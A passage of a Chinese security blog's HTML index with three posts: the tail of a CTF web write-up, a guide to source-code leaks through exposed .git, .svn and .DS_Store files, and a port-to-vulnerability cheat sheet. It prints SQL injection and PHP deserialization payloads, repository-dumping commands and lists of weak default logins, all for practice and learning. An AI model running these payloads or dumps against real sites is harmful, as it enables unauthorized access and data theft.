class="line">$flag=&apos;*******&apos;;</div><div class="line">if(noother_says_correct($_GET[&apos;key&apos;]))</div><div class="line">    echo $flag;</div><div class="line">else </div><div class="line">    echo &apos;access denied&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>要求：id中的字符串不能有数字，而想得到flag又要进去的是要数字</p>
<p>构造：54975581388的16进制 0xccccccccc</p>
<p>提交得到flag:nctf{follow_your_dream}</p>
<h4 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h4><p>其中涉及了URL编码和base64编码，burp抓包修改成admin就行</p>
<p>nctf{reset_password_often_have_vuln}</p>
<h4 id="php反序列化"><a href="#php反序列化" class="headerlink" title=".php反序列化"></a>.php反序列化</h4><p>审计！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">class just4fun &#123;</div><div class="line">    var $enter;</div><div class="line">    var $secret;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if (isset($_GET[&apos;pass&apos;])) &#123;</div><div class="line">    $pass = $_GET[&apos;pass&apos;];</div><div class="line"></div><div class="line">    if(get_magic_quotes_gpc())&#123;</div><div class="line">        $pass=stripslashes($pass);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $o = unserialize($pass);</div><div class="line"></div><div class="line">    if ($o) &#123;</div><div class="line">        $o-&gt;secret = &quot;*&quot;;</div><div class="line">        if ($o-&gt;secret === $o-&gt;enter)</div><div class="line">            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;</div><div class="line">        else </div><div class="line">            echo &quot;Oh no... You can&apos;t fool me&quot;;</div><div class="line">    &#125;</div><div class="line">    else echo &quot;are you trolling?&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>题目的意思就是一个序列化过后的字符串与类中的变量始终保持相同，可以想到引用a=&amp;b</p>
<p>（这可以当成一个专题讲讲）</p>
<p>1.php的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?php   </div><div class="line"></div><div class="line">class just4fun &#123;  </div><div class="line"></div><div class="line">    var $enter;  </div><div class="line"></div><div class="line">    var $secret;  </div><div class="line"></div><div class="line">    function just4fun()  </div><div class="line"></div><div class="line">    &#123;  </div><div class="line"></div><div class="line">        $this-&gt;enter=&amp;$this-&gt;secret;  </div><div class="line"></div><div class="line">    &#125;  </div><div class="line"></div><div class="line">&#125;  </div><div class="line"></div><div class="line">echo serialize(new just4fun());  </div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>执行一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  Desktop php 1.php</div><div class="line"></div><div class="line">O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</div></pre></td></tr></table></figure>
<p>构造：</p>
<p><a href="http://115.28.150.176/php1/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}" target="_blank" rel="external">http://115.28.150.176/php1/index.php?pass=O:8:”just4fun”:2:{s:5:”enter”;N;s:6:”secret”;R:2;}</a></p>
<p>得到flag</p>
<p>nctf{serialize_and_unserialize}</p>
<h4 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h4><p>审计！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;!--</div><div class="line">#GOAL: login as admin,then get the flag;</div><div class="line">error_reporting(0);</div><div class="line">require &apos;db.inc.php&apos;;</div><div class="line"></div><div class="line">function clean($str)&#123;</div><div class="line">	if(get_magic_quotes_gpc())&#123;//当 magic_quotes_gpc 打开时，所有的 ’ (单引号), ” (双引号),                   \ (反斜线) and 空字符会自动转为含有反斜线的转义字符</div><div class="line">		$str=stripslashes($str);//与stripslashes()搭配使用，此函数是删除所有的\的 </div><div class="line">	&#125;</div><div class="line">	return htmlentities($str, ENT_QUOTES);//htmlentities($str, ENT_QUOTES)是指编码所有的双引号和单引号</div><div class="line">&#125;</div><div class="line"></div><div class="line">$username = @clean((string)$_GET[&apos;username&apos;]);</div><div class="line">$password = @clean((string)$_GET[&apos;password&apos;]);</div><div class="line"></div><div class="line">$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;</div><div class="line">$result=mysql_query($query);</div><div class="line">if(!$result || mysql_num_rows($result) &lt; 1)&#123;</div><div class="line">	die(&apos;Invalid password!&apos;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">echo $flag;</div><div class="line">--&gt;</div></pre></td></tr></table></figure>
<p>重点在于：</p>
<p>在这里由于’被转编码，所以可以使用\转义</p>
<p><code>$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;</code></p>
<p>构造：<code>http://chinalover.sinaapp.com/web15/index.php?username=admin\&amp;password=%20or%201%23</code></p>
<p>插入后大致的sql语句为：<code>SELECT * FROM users WHERE name=’ admin\’ AND pass=’ or 1#’;</code></p>
<h4 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h4><p>zh个很有意思，首先是一个jsfuck，不用解码，直接执行就可以</p>
<p>执行后得到：1bc29b36f623ba82aaf6724fd3b16718.php</p>
<p>打开发现不是这回事</p>
<p>又看提示，想到bash的一些相关，再看这个网页的header发现tip “history of bash”</p>
<p>bash_history是用来存放历史记录的，所以我们就访问</p>
<p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="external">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a></p>
<p>又得到提示：zip -r flagbak.zip ./*</p>
<p>那么就访问这个：</p>
<p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="external">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></p>
<p>下载解压得到flag is:nctf{bash_history_means_what}</p>
<h4 id="有源码"><a href="#有源码" class="headerlink" title="有源码"></a>有源码</h4><p>给了题目的源码，可以自己搭建环境来尝试</p>
<p><a href="https://github.com/otakekumi/NUPT_Challenges/tree/master/WEB" target="_blank" rel="external">https://github.com/otakekumi/NUPT_Challenges/tree/master/WEB</a></p>
<h4 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h4><p>审计！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = $_POST[user];</div><div class="line">  $pass = md5($_POST[pass]);</div><div class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;));</div><div class="line">  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</div><div class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</div><div class="line">  &#125;</div><div class="line">  else &#123;</div><div class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>strcasecmp是不分大小比较，这样只要得到密码md5值相同即可，提示已经说了用union所以我们来构造payload：</p>
<p>username填写’ union select md5(1)#</p>
<p>password填写1</p>
<p>得flag：ntcf{union_select_is_wtf}</p>
<p>剩余的题目不建议小白来做，想做的看这个链接</p>
<p><a href="http://blog.csdn.net/qq_31481187/article/details/52097287?locationNum=9" target="_blank" rel="external">http://blog.csdn.net/qq_31481187/article/details/52097287?locationNum=9</a></p>
<p>或者：</p>
<p><a href="https://www.40huo.cn/blog/nctf-writeup.html" target="_blank" rel="external">https://www.40huo.cn/blog/nctf-writeup.html</a></p>
<p>（ps：东西太多写不动了。。。）</p>
<p>总结：可以写点base64、base32、url编码解码、文本与16进制转换的小工具。&lt;&lt;&lt;可以练手，但是hackbar带全了和burp</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/25/常见Web源码泄露总结/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/25/常见Web源码泄露总结/" itemprop="url">
                  常见Web源码泄露总结
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-25T10:50:24+08:00">
                2017-01-25
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/25/常见Web源码泄露总结/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/25/常见Web源码泄露总结/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/25/常见Web源码泄露总结/" class="leancloud_visitors" data-flag-title="常见Web源码泄露总结">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。</p>
<h3 id="源码泄漏分类"><a href="#源码泄漏分类" class="headerlink" title="源码泄漏分类"></a>源码泄漏分类</h3><h4 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title=".hg源码泄漏"></a>.hg源码泄漏</h4><h5 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>hg init的时候会生成.hg</p>
<p>e.g.<a href="http://www.example.com/.hg/" target="_blank" rel="external">http://www.example.com/.hg/</a></p>
<h5 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-hg.pl -v -u http://www.example.com/.hg/</div></pre></td></tr></table></figure>
<h4 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h4><h5 id="漏洞成因：-1"><a href="#漏洞成因：-1" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>
<p>e.g. <a href="http://www.example.com/.git/config" target="_blank" rel="external">http://www.example.com/.git/config</a></p>
<h5 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><p>工具：</p>
<p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GitHack.py http://www.example.com/.git/</div></pre></td></tr></table></figure>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-git.pl -v -u http://www.example.com/.git/</div></pre></td></tr></table></figure>
<h4 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h4><h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因:"></a>漏洞成因:</h5><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h5><p><a href="http://www.example.com/.ds_store" target="_blank" rel="external">http://www.example.com/.ds_store</a></p>
<p>注意路径检查</p>
<p>网站备份压缩文件</p>
<p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
<p>工具：</p>
<p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="external">ds_store_exp</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ds_store_exp.py http://www.example.com/.DS_Store</div></pre></td></tr></table></figure>
<h5 id="漏洞成因及危害"><a href="#漏洞成因及危害" class="headerlink" title="漏洞成因及危害:"></a>漏洞成因及危害:</h5><p>该漏洞的成因主要有以下两种：</p>
<ol>
<li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li>
<li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li>
</ol>
<h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">.rar</div><div class="line"></div><div class="line">.zip</div><div class="line"></div><div class="line">.7z</div><div class="line"></div><div class="line">.tar.gz</div><div class="line"></div><div class="line">.bak</div><div class="line"></div><div class="line">.swp</div><div class="line"></div><div class="line">.txt</div><div class="line"></div><div class="line">.html</div></pre></td></tr></table></figure>
<h5 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -name <span class="string">".DS_Store"</span> -print0 | xargs -0 rm -rf <span class="comment">#递归删除".DS_Store"文件</span></div></pre></td></tr></table></figure>
<h4 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h4><h5 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h5><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p>
<p>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p>
<p>e.g.<a href="http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries" target="_blank" rel="external">http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries</a></p>
<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h5><p>工具：</p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-svn.pl -v -u http://www.example.com/.svn/</div></pre></td></tr></table></figure>
<p><a href="https://pan.baidu.com/s/1mrNpB" target="_blank" rel="external">Seay-Svn</a></p>
<h4 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h4><h5 id="简介：-1"><a href="#简介：-1" class="headerlink" title="简介："></a>简介：</h5><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF主要包含一下文件或目录：</p>
<p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件</p>
<h5 id="漏洞成因：-2"><a href="#漏洞成因：-2" class="headerlink" title="漏洞成因："></a>漏洞成因：</h5><p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
<h5 id="漏洞检测以及利用方法："><a href="#漏洞检测以及利用方法：" class="headerlink" title="漏洞检测以及利用方法："></a>漏洞检测以及利用方法：</h5><p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</p>
<p>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>
<h4 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h4><h5 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>测试的目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://url/CVS/Root 返回根信息</div><div class="line"></div><div class="line">http://url/CVS/Entries 返回所有文件的结构</div></pre></td></tr></table></figure>
<p>取回源码的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bk clone http://url/name dir</div></pre></td></tr></table></figure>
<p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>
<p>查看所有的改变的命令，转到download的目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bk changes</div></pre></td></tr></table></figure>
<h4 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h4><h5 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>工具：</p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</div></pre></td></tr></table></figure>
<h3 id="神器"><a href="#神器" class="headerlink" title="神器"></a>神器</h3><p><a href="[http://www.bitkeeper.com/installation.instructions](http://www.bitkeeper.com/installation.instructions">Bitkeeper</a>)</p>
<p><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="external">weakfilescan</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/21296806?refer=Anonymous0" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/21296806?refer=Anonymous0</a></p>
<p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="external">http://www.s2.sshz.org/post/source-code-leak/</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/24/PORT-服务-漏洞/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="ZEROYU">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="ZEROYU">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/01/24/PORT-服务-漏洞/" itemprop="url">
                  PORT=>服务/漏洞
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-24T15:29:05+08:00">
                2017-01-24
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/01/24/PORT-服务-漏洞/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/24/PORT-服务-漏洞/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          

          
          
             <span id="/2017/01/24/PORT-服务-漏洞/" class="leancloud_visitors" data-flag-title="PORT=>服务/漏洞">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>范围：0-65535<br>固定端口：0-1023 1024保留<br>动态端口：1024-65535</p>
<h4 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h4><p>21：FTP(爆破)</p>
<p>22：SSH(爆破)</p>
<p>23：Telnet(爆破)</p>
<p>25：SMTP</p>
<p>53：DNS（UDP）</p>
<p>69：TFTP（cisco，类似FTP）</p>
<p>79：Finger</p>
<p>80：HTTP</p>
<p>110：POP3</p>
<p>111：RPC 远程过程调用</p>
<p>113：windows 验证服务</p>
<p>119：NNTP 网络新闻组传输协议</p>
<p>135：RPC 远程过程调用</p>
<p>137：NetBIOS</p>
<p>139：windows文件和打印机共享，Unix中的samba服务</p>
<p>161：SNMP 简单网络管理协议</p>
<p>389：LDAP</p>
<p>443：HTTPS</p>
<p>445：SMB</p>
<p>1080：socks代理服务</p>
<p>2082/2083 cpanel主机管理系统登陆 (国外用较多)</p>
<p>2222 DA虚拟主机管理系统登陆 (国外用较多)</p>
<p>2601,2604：zebra路由，默认密码zebra</p>
<p>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </p>
<p>3312/3311 kangle主机管理系统登陆 </p>
<p>3389:远程桌面</p>
<p>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </p>
<p>5900：vnc</p>
<p>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网</p>
<p>7001,7002 WebLogic默认弱口令，反序列</p>
<p>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </p>
<p>8080：用户www代理服务,tomcat/WDCP主机管理系统，默认弱口令 </p>
<p>8080,8089,9090 JBOSS</p>
<p>8083 Vestacp主机管理系统 （国外用较多） </p>
<p>8649 ganglia </p>
<p>8888 amh/LuManager 主机管理系统默认端口 </p>
<p>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </p>
<p>10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </p>
<p>11211 memcache未授权访问 </p>
<p>27017,27018 Mongodb未授权访问 </p>
<p>28017 mongodb统计页面 </p>
<p>50000 SAP命令执行 </p>
<p>50070,50030 hadoop默认端口未授权访问</p>
<h4 id="木马病毒"><a href="#木马病毒" class="headerlink" title="木马病毒"></a>木马病毒</h4><p>5554：worm.Sasser病毒利用端口<br>7626：冰河病毒<br>8011：WAY2.4病毒<br>7306：Netspy3.0病毒<br>1024：YAI病毒</p>
<h4 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h4><p>7001,7002：weblogic<br>9080：webshpere应用程序<br>9090：webshpere管理工具<br>8080：tomcat默认端口<br>Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080</p>
<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>3306：mysql<br>1433：mssqlserver<br>1434：sqlserver monitor<br>1521：oracle:(iSqlPlus Port:5560,7778)<br>5432：PostgreSQL<br>1158：ORACLE EMCTL<br>8080：Oracle XDB<br>2100：Oracle XDB FTP</p>
<h4 id="特殊服务（漏洞）"><a href="#特殊服务（漏洞）" class="headerlink" title="特殊服务（漏洞）"></a>特殊服务（漏洞）</h4><p>443：SSL心脏滴血</p>
<p>512,513,514：Rsync未授权访问</p>
<p>873：Rsync未授权访问</p>
<p>1025,111 NFS </p>
<p>2375：docker remote api漏洞</p>
<p>50000：SAP命令执行</p>
<p>5984：CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="external">http://xxx:5984/_utils/</a></p>
<p>6379：redis未授权</p>
<p>7001,7002：WebLogic 默认弱口令，反序列化</p>
<p>9200,9300：elasticsearch未授权访问</p>
<p>11211：memcache未授权访问</p>
<p>27017,27018：Mongodb 未授权访问<br>28017：mongodb统计页面</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
